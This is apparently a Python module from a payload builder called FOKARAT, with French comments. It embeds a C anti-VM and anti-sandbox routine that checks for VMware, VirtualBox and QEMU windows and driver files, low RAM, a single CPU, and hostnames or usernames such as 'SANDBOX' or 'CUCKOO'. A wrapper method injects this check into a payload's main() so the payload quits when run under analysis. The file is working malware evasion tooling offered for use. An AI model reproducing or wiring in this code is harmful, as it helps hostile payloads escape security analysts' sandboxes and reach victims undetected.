"""
FOKARAT - Anti-VM / Anti-Sandbox
Détecte les environnements d'analyse et empêche l'exécution.
"""
from core.logger import Logger

logger = Logger()


class AntiVMGenerator:

    C_CODE = r'''
#include <windows.h>
#include <stdio.h>
#include <string.h>

BOOL is_vm() {
    // 1. Détection par fenêtres (VMware, VirtualBox, QEMU)
    const char* windows[] = {"VMware", "VirtualBox", "VBox", "QEMU", NULL};
    for (int i = 0; windows[i]; i++) {
        if (FindWindowA(NULL, windows[i])) return TRUE;
    }

    // 2. Détection par fichiers drivers
    const char* files[] = {
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\drivers\\qemu-ga.sys",
        NULL
    };
    for (int i = 0; files[i]; i++) {
        if (GetFileAttributesA(files[i]) != INVALID_FILE_ATTRIBUTES) return TRUE;
    }

    // 3. Détection par RAM (< 2 Go = sandbox probable)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return TRUE;
    }

    // 4. Détection par nombre de CPUs (< 2 = sandbox probable)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // 5. Détection par nom de machine
    char hostname[256] = {0};
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size)) {
        const char* suspicious[] = {"SANDBOX", "MALWARE", "VIRUS", "CUCKOO",
                                     "ANALYSIS", "VMWARE", "VIRTUAL", NULL};
        for (int i = 0; suspicious[i]; i++) {
            if (strstr(hostname, suspicious[i])) return TRUE;
        }
    }

    // 6. Détection par utilisateur
    char username[256] = {0};
    size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        const char* sus_users[] = {"sandbox", "malware", "virus", "cuckoo", NULL};
        for (int i = 0; sus_users[i]; i++) {
            if (strstr(username, sus_users[i])) return TRUE;
        }
    }

    return FALSE;
}
'''

    def wrap_with_anti_vm(self, payload_code):
        wrapped = self.C_CODE + "\n\n" + payload_code
        wrapped = wrapped.replace(
            "int main() {",
            "int main() {\n    if (is_vm()) { return 1; }"
        )
        logger.success("Protection Anti-VM ajoutée")
        return wrapped